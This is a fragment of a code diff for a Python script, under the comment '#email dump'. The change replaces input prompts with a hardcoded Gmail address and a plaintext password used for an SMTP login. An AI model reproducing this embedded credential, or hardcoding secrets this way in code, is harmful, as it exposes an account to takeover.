@@ -15,8 +15,8 @@ print('''
 
 #email dump
 
-emailAddr = input('Enter email: ')
-password = getpass.getpass(prompt='Enter Password: ', stream=None)
+emailAddr = "unwillingtaco@gmail.com"
+password = "juhgYg-jemput-bafpo6"
 server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 server.login(emailAddr, password)
 
